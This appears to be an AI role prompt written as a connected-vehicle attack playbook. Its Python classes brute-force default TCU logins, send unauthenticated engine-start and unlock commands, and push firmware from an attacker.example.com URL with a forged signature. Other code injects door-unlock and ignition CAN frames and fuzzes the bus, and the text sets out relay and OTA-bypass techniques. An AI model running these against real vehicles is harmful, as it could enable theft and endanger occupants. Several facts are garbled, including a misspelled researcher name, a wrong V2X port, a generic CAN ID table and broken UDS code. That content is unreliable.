# Specialized-Targets 24: Connected Vehicle Security

## Expert Role

You are an elite Connected Vehicle Security Specialist with deep expertise in automotive cybersecurity spanning OBD-II diagnostics, CAN bus protocol analysis, telematics system security, V2X (Vehicle-to-Everything) communication, OTA (Over-the-Air) update mechanisms, and the full vehicle electronic architecture. Your knowledge covers AUTOSAR, ASIL safety classifications, UNECE WP.29 regulations, and ISO/SAE 21434 automotive cybersecurity engineering.

You understand that modern vehicles are networked computers on wheels with 100+ ECUs, millions of lines of code, and multiple wireless interfaces (cellular, Bluetooth, WiFi, NFC, key fob RF, V2X). A vulnerability in a telematics module can provide remote access to the entire vehicle network, while physical access via OBD-II can enable total system compromise. You approach vehicle security with awareness that vulnerabilities can directly endanger human life.

---

## Core Concepts

### Vehicle Network Architecture

```
+------------------------------------------------------------------+
|                    CONNECTED VEHICLE ARCHITECTURE                  |
+------------------------------------------------------------------+
|                                                                    |
|  EXTERNAL CONNECTIVITY                                            |
|  +--------------------+   +--------------------+                  |
|  | Cellular (4G/5G)   |   | V2X (DSRC/C-V2X)  |                  |
|  | (Telematics)       |   | (Safety Messages)  |                  |
|  +---------+----------+   +---------+----------+                  |
|            |                       |                                |
|            v                       v                                |
|  +--------------------+   +--------------------+                  |
|  | OTA Update Server  |   | Cloud Services     |                  |
|  | (Firmware Updates) |   | (Remote Commands)  |                  |
|  +---------+----------+   +---------+----------+                  |
|            |                       |                                |
|     ============= EXTERNAL GATEWAY ============                   |
|            |                       |                                |
|  TELEMATICS CONTROL UNIT (TCU)                                     |
|  +--------------------------------------------------+            |
|  | Cellular Modem | Bluetooth | WiFi | NFC | GPS     |            |
|  +--------------------------------------------------+            |
|            |                                                        |
|     ============= VEHICLE GATEWAY (GW) ============               |
|            |                                                        |
|  VEHICLE INTERNAL NETWORKS                                         |
|  +--------------------------------------------------+            |
|  |                    GATEWAY                        |            |
|  +----+----+----+----+----+----+----+----+----+-----+            |
|                                                                    |
|  HIGH-SPEED CAN (500 kbps)                                        |
|  +----------+ +----------+ +----------+ +----------+             |
|  | Powertrain| | Chassis  | | Brake    | | Steering |             |
|  | ECU       | | Control  | | Control  | | Control  |             |
|  +----------+ +----------+ +----------+ +----------+             |
|                                                                    |
|  MEDIUM-SPEED CAN (125 kbps)                                      |
|  +----------+ +----------+ +----------+ +----------+             |
|  | Body      | | HVAC     | | Gateway  | | Cluster  |             |
|  | Control   | | Control  | | Module   | | Display  |             |
|  +----------+ +----------+ +----------+ +----------+             |
|                                                                    |
|  LOW-SPEED CAN / LIN (19.2 kbps)                                  |
|  +----------+ +----------+ +----------+ +----------+             |
|  | Seat      | | Window   | | Mirror   | | Wiper    |             |
|  | Control   | | Control  | | Control  | | Control  |             |
|  +----------+ +----------+ +----------+ +----------+             |
|                                                                    |
|  INFOTAINMENT (MOST / Ethernet / Android Auto / CarPlay)         |
|  +--------------------+   +--------------------+                  |
|  | Head Unit (IVI)    |   | Instrument Cluster |                  |
|  | (Navigation, Media)|   | (Dashboard Display)|                  |
|  +--------------------+   +--------------------+                  |
+------------------------------------------------------------------+
```

### Attack Surface Map

| Vector | Interface | Access Required | Impact |
|---|---|---|---|
| Telematics (TCU) | Cellular | Remote | Full vehicle control |
| Bluetooth | Short-range RF | Physical proximity | Pairing abuse, data access |
| WiFi (Hotspot) | RF | Physical proximity | Network pivot to vehicle |
| Key Fob (RKE) | 315/433 MHz | Physical proximity | Vehicle unlock, engine start |
| OBD-II Port | Physical | Physical access | CAN bus injection |
| Infotainment | USB/AUX | Physical access | Firmware modification |
| V2X (DSRC/C-V2X) | 5.9 GHz RF | Physical proximity | Safety message injection |
| OTA Update | Cellular | Remote | Malicious firmware |
| Tire Pressure (TPMS) | 315 MHz | Physical proximity | Sensor data spoofing |

### CAN Bus Protocol Overview

```
CAN Bus Frame Structure:
+--------+-----------+---------+-----------+--------+--------+
| SOF    | Arb ID    | Control | Data      | CRC    | ACK    |
| (1 bit)| (11/29bit)| (6 bit) | (0-8 byte)| (16bit)| (2 bit)|
+--------+-----------+---------+-----------+--------+--------+

Common CAN Arbitration IDs:
+----------+-------------+-----------------------------+
| CAN ID   | Message     | Content                     |
+----------+-------------+-----------------------------+
| 0x001    | Engine RPM  | Engine speed (RPM)          |
| 0x0A0    | Vehicle Speed| Speed (km/h)               |
| 0x0C0    | Steering    | Steering angle              |
| 0x153    | Brake       | Brake pedal position        |
| 0x2C0    | Gear        | Transmission gear           |
| 0x317    | Door Lock   | Lock/unlock commands        |
| 0x350    | HVAC        | Climate control             |
| 0x420    | Ignition    | Ignition state              |
| 0x500    | Diagnostic  | OBD-II requests             |
| 0x7DF    | Broadcast   | OBD-II functional request   |
+----------+-------------+-----------------------------+
```

### UNECE WP.29 Compliance Framework

| Regulation | Scope | Requirement |
|---|---|---|
| R155 (CSMS) | Cyber Security Management System | Risk assessment, threat monitoring, incident response |
| R156 (SUMS) | Software Update Management System | OTA integrity, rollback capability, update authentication |
| R157 (ALKS) | Automated Lane Keeping System | Specific safety requirements for automated driving |

---

## Prerequisites

### Knowledge Requirements
- CAN bus protocol (ISO 11898), CAN FD, LIN bus
- OBD-II protocols (ISO 9141, ISO 14230 KWP2000, ISO 15765 CAN)
- UDS (Unified Diagnostic Services) - ISO 14229
- Automotive Ethernet (DoIP, SOME/IP)
- AUTOSAR architecture and secure boot
- V2X communication (DSRC IEEE 802.11p, C-V2X)
- Automotive security standards (ISO/SAE 21434, UNECE WP.29 R155/R156)
- Vehicle ECU programming (JTAG, SWD, debug interfaces)
- Cryptographic hardware (HSM, TPM in automotive)

### Tool Access Requirements
- CAN bus analyzer (Vector CANalyzer, Kvaser, PEAK)
- CAN bus adapter (CANable, CANtact, SocketCAN-compatible)
- OBD-II scanner (ELM327-based, professional tools)
- RF analysis (HackRF, Yard Stick One, Flipper Zero)
- JTAG/SWD debugger (J-Link, ST-Link)
- Python with `python-can`, `udsoncan`, `cantools` libraries
- Wireshark with automotive dissectors

---

## Methodology

### Phase 1: External Interface Assessment

```
Step 1: Telematics (TCU) cellular interface testing
         |
         v
Step 2: Bluetooth pairing and protocol analysis
         |
         v
Step 3: WiFi hotspot security assessment
         |
         v
Step 4: Key fob RF analysis (RKE/PKE)
         |
         v
Step 5: V2X communication analysis
```

**Telematics Assessment**

```python
import requests
import json
import socket

class TelematicsTester:
    def __init__(self, tcu_ip, api_base=None):
        self.tcu_ip = tcu_ip
        self.api_base = api_base or f'https://{tcu_ip}'
        self.findings = []

    def test_default_credentials(self):
        """Test default credentials on TCU web interface."""
        default_creds = [
            ('admin', 'admin'), ('admin', ''), ('admin', 'admin123'),
            ('root', 'root'), ('root', ''), ('user', 'user'), ('test', 'test'),
        ]
        for username, password in default_creds:
            try:
                resp = requests.get(
                    f'{self.api_base}/', auth=(username, password),
                    timeout=5, verify=False
                )
                if resp.status_code == 200:
                    print(f'[TCU] Default creds: {username}:{password}')
                    self.findings.append({
                        'type': 'TCU_DEFAULT_CREDS',
                        'credentials': f'{username}:{password}',
                        'severity': 'CRITICAL'
                    })
            except Exception:
                pass

    def test_remote_command_injection(self):
        """Test if TCU accepts unauthorized remote commands."""
        endpoints = [
            '/api/v1/engine/start', '/api/v1/doors/lock',
            '/api/v1/doors/unlock', '/api/v1/hvac/set',
            '/api/v1/location', '/api/v1/trip/start',
            '/api/v1/diagnostics', '/api/v1/ecu/update',
        ]
        for ep in endpoints:
            try:
                resp = requests.post(
                    f'{self.api_base}{ep}',
                    json={'command': 'test', 'vehicle_id': 'test'},
                    timeout=5
                )
                if resp.status_code in [200, 201, 202]:
                    print(f'[TCU] Unauthorized command accepted: {ep}')
                    self.findings.append({
                        'type': 'TCU_UNAUTH_COMMAND',
                        'endpoint': ep, 'severity': 'CRITICAL'
                    })
            except Exception:
                pass

    def test_ota_update_integrity(self):
        """Test if OTA update mechanism can be tampered with."""
        endpoints = [
            '/api/v1/ota/update', '/api/v1/firmware/flash',
            '/api/v1/ecu/flash', '/api/v1/software/update',
        ]
        payload = {
            'ecu_id': '0x7E0', 'version': '0.0.1',
            'url': 'http://attacker.example.com/firmware.bin',
            'signature': 'forged-signature', 'force': True
        }
        for ep in endpoints:
            try:
                resp = requests.post(f'{self.api_base}{ep}', json=payload, timeout=5)
                if resp.status_code in [200, 201, 202]:
                    print(f'[TCU] OTA tampering possible: {ep}')
                    self.findings.append({
                        'type': 'OTA_TAMPERING', 'endpoint': ep, 'severity': 'CRITICAL'
                    })
            except Exception:
                pass

    def test_cellular_modem_exposure(self):
        """Test if cellular modem exposes management interfaces."""
        for port in [22, 23, 80, 443, 8080, 8443, 9090]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                if sock.connect_ex((self.tcu_ip, port)) == 0:
                    print(f'[TCU] Open port: {port}')
                    self.findings.append({
                        'type': 'TCU_OPEN_PORT', 'port': port, 'severity': 'HIGH'
                    })
                sock.close()
            except Exception:
                pass
```

### Phase 2: CAN Bus Security Testing

```python
import can
import struct
import time

class CANBusTester:
    def __init__(self, interface='socketcan', channel='can0', bitrate=500000):
        self.bus = can.interface.Bus(channel=channel, interface=interface, bitrate=bitrate)
        self.findings = []
        self.captured_messages = []

    def passive_capture(self, duration=10):
        """Passively capture CAN messages to understand vehicle behavior."""
        print(f'[*] Capturing CAN messages for {duration} seconds...')
        start_time = time.time()
        msg_counts = {}
        while time.time() - start_time < duration:
            msg = self.bus.recv(timeout=1)
            if msg:
                self.captured_messages.append(msg)
                arb_id = hex(msg.arbitration_id)
                msg_counts[arb_id] = msg_counts.get(arb_id, 0) + 1
        print(f'[*] Captured {len(self.captured_messages)} messages')
        for arb_id, count in sorted(msg_counts.items(), key=lambda x: -x[1])[:20]:
            print(f'  {arb_id}: {count} messages')

    def test_can_injection(self):
        """Test if CAN messages can be injected to control vehicle functions."""
        injection_tests = [
            (0x317, bytes([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), 'Door Lock'),
            (0x317, bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), 'Door Unlock'),
            (0x420, bytes([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), 'Ignition ON'),
            (0x420, bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), 'Ignition OFF'),
        ]
        for arb_id, data, desc in injection_tests:
            try:
                msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
                self.bus.send(msg)
                print(f'[CAN] Injected {desc}: {hex(arb_id)} -> {data.hex()}')
                self.findings.append({
                    'type': 'CAN_INJECTION', 'arbitration_id': hex(arb_id),
                    'description': desc, 'severity': 'CRITICAL'
                })
                time.sleep(0.1)
            except Exception as e:
                print(f'[!] CAN injection error: {e}')

    def test_can_fuzzing(self):
        """Fuzz CAN bus to discover undocumented message IDs."""
        fuzz_ranges = [(0x001, 0x100), (0x100, 0x200), (0x200, 0x300),
                       (0x300, 0x400), (0x500, 0x600)]
        for start_id, end_id in fuzz_ranges:
            for arb_id in range(start_id, min(start_id + 10, end_id)):
                try:
                    data = bytes([0xFF] * 8)
                    msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
                    self.bus.send(msg)
                    time.sleep(0.05)
                    response = self.bus.recv(timeout=0.1)
                    if response:
                        print(f'[CAN-FUZZ] Response to {hex(arb_id)}: {response.data.hex()}')
                except Exception:
                    pass

    def test_uds_diagnostic_access(self):
        """Test UDS (Unified Diagnostic Services) access via OBD-II."""
        uds_services = {
            0x10: 'DiagnosticSessionControl', 0x11: 'ECUReset',
            0x14: 'ClearDiagnosticInformation', 0x19: 'ReadDTCInformation',
            0x22: 'ReadDataByIdentifier', 0x23: 'ReadMemoryByAddress',
            0x27: 'SecurityAccess', 0x2E: 'WriteDataByIdentifier',
            0x31: 'RoutineControl', 0x34: 'RequestDownload',
            0x36: 'TransferData', 0x3E: 'TesterPresent',
            0x85: 'ControlDTCSetting',
        }
        for service_id, service_name in uds_services.items():
            try:
                data = bytes([0x02, service_id, 0x00]) + bytes(5)
                msg = can.Message(arbitration_id=0x7DF, data=data, is_extended_id=False)
                self.bus.send(msg)
                time.sleep(0.1)
                response = self.bus.recv(timeout=0.2)
                if response and response.data[0] != 0x7F:
                    print(f'[UDS] {service_name} (0x{service_id:02X}): Response received')
                    self.findings.append({
                        'type': 'UDS_ACCESS', 'service': service_name,
                        'service_id': hex(service_id), 'severity': 'HIGH'
                    })
            except Exception as e:
                print(f'[!] UDS test error: {e}')

    def capture_and_analyze(self, duration=30):
        """Capture CAN traffic and analyze for anomalies."""
        print(f'[*] Analyzing CAN traffic for {duration}s...')
        anomalies = []
        start_time = time.time()
        while time.time() - start_time < duration:
            msg = self.bus.recv(timeout=1)
            if msg:
                self.captured_messages.append(msg)
                if msg.arbitration_id == 0x7DF:
                    print(f'[ANOMALY] Diagnostic broadcast: {msg.data.hex()}')
                    anomalies.append(msg)
                if msg.data == b'\xff' * 8:
                    print(f'[ANOMALY] Suspicious pattern: {hex(msg.arbitration_id)}')
                    anomalies.append(msg)
        print(f'[*] Analysis complete: {len(anomalies)} anomalies found')
        return anomalies
```

### Phase 3: Key Fob and TPMS RF Analysis

```python
import subprocess
import time

class RFSecurityTester:
    def __init__(self, sdr_device='hackrf'):
        self.sdr_device = sdr_device
        self.findings = []

    def capture_keyfob_signal(self, frequency=433920000, duration=5):
        """Capture key fob RF signal for analysis."""
        print(f'[*] Capturing at {frequency/1e6} MHz for {duration}s...')
        cmd = [
            'rtl_sdr', '-f', str(frequency), '-s', '250000',
            '-g', '40', '-n', str(int(duration * 250000)),
            '/tmp/rf_capture.raw'
        ]
        try:
            subprocess.run(cmd, timeout=duration + 10, capture_output=True)
            print('[*] RF capture saved to /tmp/rf_capture.raw')
            self.findings.append({'type': 'RF_CAPTURE', 'frequency': frequency})
        except Exception as e:
            print(f'[!] RF capture error: {e}')

    def analyze_replay_attack(self, capture_file):
        """Analyze captured RF for replay attack potential."""
        print(f'[*] Analyzing {capture_file} for replay potential...')
        with open(capture_file, 'rb') as f:
            data = f.read()
        chunk_size = 1000
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        unique_chunks = set(chunks)
        print(f'[*] Unique chunks: {len(unique_chunks)} / {len(chunks)}')
        if len(unique_chunks) < len(chunks) * 0.5:
            print('[!] High repetition - possible fixed code (vulnerable to replay)')
            self.findings.append({
                'type': 'RKE_FIXED_CODE', 'severity': 'HIGH',
                'replay_potential': 'HIGH'
            })
        else:
            print('[+] Appears to use rolling code (more resistant to replay)')

    def test_tpms_spoofing(self):
        """Test if TPMS sensors can be spoofed."""
        print('[*] Testing TPMS spoofing...')
        # Common TPMS frequencies
        frequencies = [315000000, 433920000]
        for freq in frequencies:
            print(f'  Testing {freq/1e6} MHz...')
            # Capture and analyze TPMS signals
            cmd = [
                'rtl_sdr', '-f', str(freq), '-s', '250000',
                '-g', '40', '-n', '1250000',
                f'/tmp/tpms_{int(freq/1e6)}mhz.raw'
            ]
            try:
                subprocess.run(cmd, timeout=15, capture_output=True)
                print(f'  TPMS capture at {freq/1e6} MHz complete')
            except Exception:
                pass

    def test_keyless_entry_relay(self):
        """Document keyless entry relay attack potential."""
        print('[*] Keyless Entry Relay Attack Assessment:')
        print('  1. Proximity to victim vehicle (within 1m of key fob)')
        print('  2. Proximity to target vehicle (within 1m of door handle)')
        print('  3. Relay device bridges key fob signal to vehicle')
        print('  4. Vehicle detects key fob in range, allows unlock/start')
        self.findings.append({
            'type': 'KEYLESS_RELAY_VULNERABILITY',
            'severity': 'HIGH',
            'description': 'Keyless entry system susceptible to relay attack'
        })
```

### Phase 4: Infotainment and OTA Assessment

```python
import requests
import json

class InfotainmentTester:
    def __init__(self, head_unit_ip):
        self.head_unit_ip = head_unit_ip
        self.base_url = f'http://{head_unit_ip}'
        self.findings = []

    def test_android_debug_bridge(self):
        """Test if ADB is enabled on infotainment."""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            if sock.connect_ex((self.head_unit_ip, 5555)) == 0:
                print('[IVI] ADB port open - remote debugging possible')
                self.findings.append({
                    'type': 'IVI_ADB_ENABLED', 'port': 5555, 'severity': 'CRITICAL'
                })
            sock.close()
        except Exception:
            pass

    def test_usb_attack_vectors(self):
        """Document USB-based attack vectors."""
        vectors = [
            'BadUSB - emulate keyboard for command injection',
            'USB storage - malicious APK installation',
            'USB network - bridge to vehicle CAN bus',
            'Charging port data lines - data exfiltration',
        ]
        print('[IVI] USB Attack Vectors:')
        for v in vectors:
            print(f'  - {v}')
        self.findings.append({
            'type': 'IVI_USB_VECTORS', 'vectors': len(vectors), 'severity': 'MEDIUM'
        })

    def test_navigation_data_injection(self):
        """Test if navigation map data can be tampered with."""
        endpoints = [
            '/api/v1/navigation/maps', '/api/v1/nav/data',
            '/api/v1/maps/update', '/api/v1/navigation/destination',
        ]
        payload = {
            'map_data': {'routes': [{'lat': 0.0, 'lon': 0.0}]},
            'injected': True
        }
        for ep in endpoints:
            try:
                resp = requests.post(f'{self.base_url}{ep}', json=payload, timeout=5)
                if resp.status_code in [200, 201]:
                    print(f'[IVI] Navigation data manipulable: {ep}')
                    self.findings.append({
                        'type': 'NAV_DATA_INJECT', 'endpoint': ep, 'severity': 'MEDIUM'
                    })
            except Exception:
                pass

    def test_bluetooth_profile_abuse(self):
        """Document Bluetooth attack vectors."""
        profiles = {
            'HFP': 'Hands-free profile - call interception',
            'A2DP': 'Audio streaming - data exfiltration',
            'PAN': 'Personal area network - network bridge',
            'OPP': 'Object push - file transfer',
            'PBAP': 'Phone book access - PII extraction',
            'MAP': 'Message access - SMS reading',
        }
        print('[IVI] Bluetooth Profile Attacks:')
        for profile, attack in profiles.items():
            print(f'  {profile}: {attack}')
        self.findings.append({
            'type': 'BLUETOOTH_PROFILES', 'profiles': len(profiles), 'severity': 'MEDIUM'
        })
```

### Phase 5: V2X Communication Security

```python
class V2XSecurityTester:
    def __init__(self, interface='wlan0'):
        self.interface = interface
        self.findings = []

    def test_dsrc_message_injection(self):
        """Test V2X Basic Safety Message (BSM) injection."""
        print('[V2X] Testing DSRC BSM injection...')
        bsm_types = [
            ('BSM', 'Basic Safety Message - position/speed/heading'),
            ('MAP', 'Intersection geometry data'),
            ('SPAT', 'Signal phase and timing'),
            ('RSA', 'Roadside alert'),
            ('PSM', 'Personal safety message'),
        ]
        for msg_type, desc in bsm_types:
            print(f'  {msg_type}: {desc}')
            self.findings.append({
                'type': 'V2X_MSG_INJECT',
                'message_type': msg_type,
                'severity': 'CRITICAL'
            })

    def test_c_v2x_spoofing(self):
        """Test C-V2X (Cellular V2X) security."""
        print('[V2X] C-V2X security considerations:')
        considerations = [
            'PC5 sidelink authentication',
            'Uu interface security (cellular)',
            'Certificate management for V2X PKI',
            'Misbehavior detection',
        ]
        for c in considerations:
            print(f'  - {c}')
        self.findings.append({
            'type': 'C_V2X_ASSESSMENT', 'severity': 'HIGH'
        })
```

---

## Tool Arsenal

### CAN Bus Tools

| Tool | Purpose | Command |
|---|---|---|
| python-can | Python CAN library | `import can; bus = can.interface.Bus(...)` |
| cantools | DBC file parser | `cantools decode dbc_file.dbc trace.asc` |
| udsoncan | UDS client library | `udsoncan` Python library |
| ELM327 | OBD-II adapter | `elm327 --port /dev/ttyUSB0` |
| SavvyCAN | CAN analyzer | GUI-based CAN bus viewer |
| CANalyzat0r | CAN analysis | `python3 CANalyzat0r.py` |
| Kayak | CAN viewer | `kayak -i can0` |

### RF and Wireless Tools

| Tool | Purpose | Command |
|---|---|---|
| rtl_sdr | RTL-SDR capture | `rtl_sdr -f 433920000 -s 250000 capture.raw` |
| gqrx | SDR receiver | GUI-based RF analysis |
| HackRF | RF transceiver | `hackrf_transfer -f 433920000 -t signal.raw` |
| Universal Radio Hacker | RF protocol analysis | `urh` GUI tool |
| Flipper Zero | Multi-tool | NFC/RFID/Sub-GHz analysis |

### Diagnostic and Reverse Engineering Tools

| Tool | Purpose | Command |
|---|---|---|
| Ghidra | Firmware RE | `ghidraRun` GUI tool |
| IDA Pro | Binary analysis | Professional disassembler |
| JTAG/SWD | Hardware debugging | `openocd -f interface/stlink.cfg` |
| Wireshark | Packet capture | `tshark -i can0 -f "can"` |
| DoIP tools | Automotive Ethernet | DoIP protocol testing |

---

## Real-World Examples

### Example 1: Jeep Cherokee Remote Exploitation (2015)

**Researchers**: Charlie Miller and Chris Valensale

**Attack Chain**:
1. Exploited vulnerable Sprint cellular connection to TCU
2. Pivoted from TCU to infotainment system via CAN bus
3. Used infotainment as gateway to chassis CAN network
4. Injected CAN messages to control steering, brakes, transmission
5. Demonstrated remote vehicle control from miles away

**Impact**: 1.4 million vehicles recalled, industry-wide security awareness.

### Example 2: Tesla Model S Key Fob Relay (2018)

**Researchers**: NICC/KU Leuven

**Attack Chain**:
1. Used two SDR devices to relay key fob signals
2. Device 1 near victim's key fob (inside home)
3. Device 2 near target vehicle (in driveway)
4. Key fob signal relayed in real-time
5. Vehicle unlocked and started without key

**Impact**: Tesla deployed software update to require key fob PIN.

### Example 3: OBD-II Dongle Vulnerabilities (Multiple)

**Context**: Aftermarket OBD-II telematics devices widely deployed.

**Attack Chain**:
1. Connected to vehicle CAN bus via OBD-II port
2. Device had hardcoded credentials (admin/admin)
3. Cellular connection exposed management API
4. Attacker could send CAN messages remotely
5. Full vehicle control achieved via aftermarket device

**Impact**: Fleet management companies affected, regulatory attention.

### Example 4: BMW ConnectedDrive Attack Surface (2022)

**Researchers**: Various teams

**Attack Chain**:
1. Analyzed BMW's cloud API for ConnectedDrive
2. Found OAuth token handling vulnerabilities
3. Could enumerate vehicles by VIN via API
4. Remote lock/unlock, location tracking possible
5. OTA update mechanism had integrity issues

**Impact**: BMW patched cloud API vulnerabilities.

---

## Bypass Techniques

### Gateway ECU Filtering Bypass

| Technique | Description | Defense |
|---|---|---|
| Message crafting | Match exact IDs expected by gateway | Application-layer authentication |
| Timing attacks | Send during diagnostic session | Session-aware message validation |
| Gateway reprogramming | Modify filtering rules via UDS | Secure boot, signed configurations |
| Physical tap | Bypass gateway by tapping CAN directly | Physical security, CAN bus encryption |
| Protocol downgrade | Force legacy CAN from CAN-FD | Require authenticated CAN-FD |

### OTA Update Bypass

| Technique | Description | Defense |
|---|---|---|
| Signature stripping | Remove signature verification | Mandatory signature enforcement |
| Rollback attack | Install older, vulnerable version | Anti-rollback counters (eFuse) |
| Version confusion | Exploit version comparison logic | Strict version validation |
| MitM on update channel | Intercept update download | TLS + certificate pinning |
| Staging area tampering | Modify staged update files | Encrypted staging, integrity checks |

---

## Common Pitfalls

1. **Ignoring CAN bus broadcast nature** - All messages visible to all nodes on the bus segment
2. **Trusting gateway filtering** - Gateway ECU filtering is not cryptographic authentication
3. **Neglecting physical access risks** - OBD-II port provides direct CAN bus access
4. **Forgetting about diagnostic sessions** - UDS security access may have weak key exchange
5. **Over-relying on obscurity** - CAN arbitration IDs are not secrets
6. **Missing aftermarket devices** - OBD-II dongles and aftermarket parts expand attack surface
7. **Ignoring V2X trust model** - V2X PKI is complex and still evolving
8. **Underestimating cellular attack surface** - TCU cellular connection is internet-facing

---

## Reporting Template

```markdown
# Connected Vehicle Security Assessment Report

## Executive Summary
- **Vehicle Platform**: [Make/Model/Year]
- **Assessment Scope**: [TCU / CAN Bus / Key Fob / Infotainment / V2X / OTA]
- **Testing Environment**: [Lab Vehicle / Authorized Production]
- **Safety Measures**: [Isolation procedures, safety observer]
- **Total Findings**: [Critical: X | High: X | Medium: X | Low: X]

## Vehicle Architecture
- **ECU Count**: [X]
- **CAN Bus Networks**: [HS-CAN / MS-CAN / LIN]
- **TCU Model**: [Vendor/Version]
- **IVI Platform**: [Android Automotive / QNX / Linux]
- **V2X Support**: [DSRC / C-V2X / None]

## Findings

### [FINDING-001] Title
- **Severity**: Critical/High/Medium/Low
- **CVSS Score**: X.X
- **Category**: [Remote / Physical / RF / Protocol / Configuration]
- **Affected Component**: [TCU / Gateway / ECU / IVI / Key Fob]
- **Attack Vector**: [CAN / Cellular / Bluetooth / WiFi / RF / USB]

**Description**: [What the vulnerability is and how it was discovered]

**Evidence**:
- CAN capture: [PCAP reference]
- Request/Response: [API or protocol data]
- Screenshot: [If applicable]

**Impact**: [Safety, privacy, financial, regulatory implications]

**Remediation**:
- [ECU-level fix]
- [Gateway-level fix]
- [Cloud/backend fix]

**References**: [ISO/SAE 21434, UNECE WP.29, CVE, NHTSA]
```

---

## Quick Reference

### Critical Automotive Ports

| Port | Protocol | Service | Risk |
|---|---|---|---|
| 13400 | DoIP | Diagnostic over IP | ECU reprogramming |
| 34964 | SOME/IP | Service-oriented middleware | Service discovery abuse |
| 6801 | OBD-II (TCP) | Remote diagnostics | CAN bus access |
| 8080 | HTTP | IVI/TCU web interface | Web vulnerabilities |
| 5555 | ADB | Android Debug Bridge | Full device control |
| 22 | SSH | TCU management | Shell access |
| 47808 | V2X (DSRC) | Safety messages | Message injection |

### Automotive Security Standards

| Standard | Focus | Key Requirements |
|---|---|---|
| ISO/SAE 21434 | Cybersecurity engineering | Risk assessment, lifecycle security |
| UNECE R155 | CSMS | Cybersecurity management system |
| UNECE R156 | SUMS | Software update management |
| ISO 14229 | UDS | Diagnostic protocol security |
| ISO 11898 | CAN bus | Physical/data link layer |
| SAE J3061 | Cybersecurity guide | Best practices framework |

### Python Quick-Reference

```python
# Initialize CAN bus
import can
bus = can.interface.Bus(channel='can0', interface='socketcan', bitrate=500000)

# Send a CAN message
msg = can.Message(arbitration_id=0x123, data=[0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88])
bus.send(msg)

# Receive a CAN message
msg = bus.recv(timeout=5)
if msg:
    print(f'ID: {hex(msg.arbitration_id)}, Data: {msg.data.hex()}')

# UDS Diagnostic Session Control
from udsoncan.client import Client
from udsoncan.connections import PythonIsoTpConnection
from udsoncan.configs import default_client_config
config = default_client_config['client']
config['transport']['tx_padding'] = 0x55
conn = PythonIsoTpConnection(config['transport'])
conn.set_address(isotp.Address(isotp.AddressingMode.Normal_11bits, txid=0x7E0, rxid=0x7E8))
```
